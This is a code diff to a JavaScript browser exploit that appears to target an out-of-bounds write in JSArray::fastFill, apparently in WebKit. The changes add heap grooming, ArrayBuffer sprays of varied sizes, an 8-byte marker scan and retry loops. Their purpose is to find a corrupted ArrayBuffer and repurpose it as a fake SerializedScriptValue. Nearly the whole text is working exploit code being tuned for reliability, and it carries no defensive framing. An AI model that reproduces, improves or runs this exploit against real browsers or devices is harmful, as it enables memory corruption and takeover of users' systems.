@@ -85,8 +85,10 @@ const num_strs = 0x200;
 const num_leaks = 0x100;
 
 // OOB-write specific constants
-const OOB_SPRAY_COUNT = 0x200;
-const OOB_GROOM_ROUNDS = 0x100;
+// NOTE: Values increased for experimentation; tune down after success.
+const OOB_SPRAY_COUNT = 0x400;
+const OOB_GROOM_ROUNDS = 0x200;
+const OOB_MAX_RETRIES = 6;
 
 const rows = ",".repeat(ssv_len / 8 - 2);
 const original_strlen = ssv_len - off.size_strimpl;
@@ -104,24 +106,42 @@ function sread64(str, offset) {
 
 // ========== OOB-WRITE EXPLOITATION ========== //
 
+// Improved marker and helper functions for robust detection
+const MARKER = [0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44];
+
+function write_marker_to_view(u8) {
+  for (let i = 0; i < MARKER.length; i++) u8[i] = MARKER[i];
+}
+
+function match_marker(u8, offset = 0) {
+  for (let i = 0; i < MARKER.length; i++) {
+    if (u8[offset + i] !== MARKER[i]) return false;
+  }
+  return true;
+}
+
 /**
  * Trigger the fastFill OOB-write vulnerability
- * Uses the same pattern as the test case but with controlled grooming
+ * Uses an improved pattern: repeated attempts, GC yields, and diverse grooming.
  */
 async function trigger_oob_write() {
-  log("STAGE: Triggering OOB-write in JSArray::fastFill");
+  log("STAGE: Triggering OOB-write (improved)");
 
   const groomed_arrays = [];
   const array_buffers = [];
 
-  // Groom the heap with ArrayBuffers of target size
-  for (let i = 0; i < OOB_GROOM_ROUNDS; i++) {
-    for (let j = 0; j < 50; j++) {
+  // Groom the heap with ArrayBuffers of target size (vary per round a bit)
+  for (let round = 0; round < OOB_GROOM_ROUNDS; round++) {
+    const perRound = 50 + (round & 15);
+    for (let j = 0; j < perRound; j++) {
       const ab = new ArrayBuffer(ssv_len);
+      // seed beginning with a distinguishable byte so we can later differentiate
+      const v = new Uint8Array(ab);
+      v[0] = 0x99;
       array_buffers.push(ab);
     }
     gc();
-    await sleep();
+    if ((round & 3) === 0) await sleep(0);
   }
 
   log(`Groomed ${array_buffers.length} ArrayBuffers`);
@@ -132,7 +152,6 @@ async function trigger_oob_write() {
     target_array[i] = i; // Fill with markers
   }
 
-  const marker_value = { marker: 0x41414141 };
   let length_changed = false;
 
   const evil_object = {
@@ -149,59 +168,118 @@ async function trigger_oob_write() {
     }
   };
 
-  log("Triggering OOB-write...");
+  log("Triggering OOB-write attempts...");
 
-  // This causes the OOB-write
+  // Try multiple attempts because timing is critical
   try {
-    target_array.fill(marker_value, evil_object);
+    for (let attempt = 0; attempt < 4; attempt++) {
+      try {
+        // Fill with an object carrying the marker (engine may serialize or write its representation)
+        const marker_obj = { marker: MARKER.slice() };
+        target_array.fill(marker_obj, evil_object);
+      } catch (e) {
+        log(`fill attempt ${attempt} threw: ${e}`);
+      }
+      gc();
+      // Give the engine a chance to settle and possibly write out bytes
+      await sleep(1 + attempt);
+    }
   } catch (e) {
-    log(`OOB-write completed with exception: ${e}`);
+    log(`trigger_oob_write top-level exception: ${e}`);
   }
 
   return [target_array, array_buffers];
 }
 
 /**
- * Find corrupted ArrayBuffer via OOB-write
+ * Find corrupted ArrayBuffer via OOB-write (improved scan with retries and variant sizes)
  */
 async function find_corrupted_arraybuffer(target_array, array_buffers) {
-  log("STAGE: Searching for corrupted ArrayBuffer");
+  log("STAGE: Searching for corrupted ArrayBuffer (improved scan)");
 
-  // Look for ArrayBuffers that were corrupted by OOB-write
+  // First: scan initial groomed array_buffers
+  const candidates = [];
   for (let i = 0; i < array_buffers.length; i++) {
     const ab = array_buffers[i];
     const view = new Uint8Array(ab);
 
-    // Check if this ArrayBuffer was corrupted (has our marker)
-    if (view[0] === 0x41 && view[1] === 0x41 && view[2] === 0x41 && view[3] === 0x41) {
-      log(`Found corrupted ArrayBuffer at index: ${i}`);
-
-      // Set up as fake SerializedScriptValue
-      view[0] = 1; // refcount
-      view.fill(0, 1); // clear other fields
-
-      return new BufferView(ab);
+    // scan first 32 bytes for our 8-byte marker at any alignment
+    const maxScan = Math.min(24, Math.max(0, view.length - MARKER.length));
+    for (let off = 0; off <= maxScan; off++) {
+      if (match_marker(view, off)) {
+        log(`Found corrupted ArrayBuffer in initial groom at index ${i} offset ${off}`);
+        candidates.push({ ab, index: i, off });
+        break;
+      }
     }
   }
 
-  // If not found in initial scan, try more aggressive search
-  log("Secondary scan for corrupted memory...");
-
-  const additional_spray = [];
-  for (let i = 0; i < OOB_SPRAY_COUNT; i++) {
-    const ab = new ArrayBuffer(ssv_len);
-    const view = new Uint8Array(ab);
-
-    if (view[0] === 0x41) {
-      log(`Found corrupted ArrayBuffer in secondary spray at index: ${i}`);
-      view[0] = 1;
-      view.fill(0, 1);
-      return new BufferView(ab);
-    }
-    additional_spray.push(ab);
+  if (candidates.length) {
+    const c = candidates[0];
+    const v = new Uint8Array(c.ab);
+    // sanitize into SSV-like layout
+    v[0] = 1;
+    v.fill(0, 1);
+    return new BufferView(c.ab);
   }
 
-  die("Failed to find corrupted ArrayBuffer via OOB-write");
+  log("No candidate in initial groom. Running secondary sprays and variant sizes...");
+
+  // Secondary sprays with varied sizes and retries
+  for (let retry = 0; retry < OOB_MAX_RETRIES; retry++) {
+    log(`secondary spray retry ${retry + 1}/${OOB_MAX_RETRIES}`);
+    const additional = [];
+    const sizes = [ssv_len, Math.max(8, ssv_len + 8), Math.max(8, ssv_len - 8), ssv_len * 2];
+
+    for (let i = 0; i < OOB_SPRAY_COUNT; i++) {
+      const size = sizes[i % sizes.length];
+      const ab = new ArrayBuffer(size);
+      const view = new Uint8Array(ab);
+      // seed beginning with a known byte to differentiate
+      view[0] = 0x77;
+      additional.push(ab);
+
+      // quick immediate check: maybe corruption already present
+      if (view.length >= MARKER.length && match_marker(view, 0)) {
+        log(`Found corrupted ArrayBuffer in secondary spray at idx ${i}, size ${size}`);
+        view[0] = 1;
+        view.fill(0, 1);
+        return new BufferView(ab);
+      }
+    }
+
+    // Give time for any delayed writes
+    gc();
+    await sleep(10);
+
+    // scan additional spray for marker anywhere (first 32 bytes)
+    for (let i = 0; i < additional.length; i++) {
+      const ab = additional[i];
+      const view = new Uint8Array(ab);
+      const maxScan = Math.min(24, Math.max(0, view.length - MARKER.length));
+      for (let off = 0; off <= maxScan; off++) {
+        if (match_marker(view, off)) {
+          log(`Found corrupted ArrayBuffer in additional spray index ${i} offset ${off}`);
+          view[0] = 1;
+          view.fill(0, 1);
+          return new BufferView(ab);
+        }
+      }
+    }
+
+    // If not found, increase grooming pressure and try again
+    log(`retry ${retry + 1} failed; increasing groom pressure and trying again`);
+    for (let k = 0; k < 20; k++) {
+      const ab = new ArrayBuffer(ssv_len);
+      const v = new Uint8Array(ab);
+      v[0] = 0x55;
+      array_buffers.push(ab);
+    }
+    gc();
+    await sleep(5);
+  }
+
+  die("Failed to find corrupted ArrayBuffer via OOB-write (improved)");
 }
 
 /**
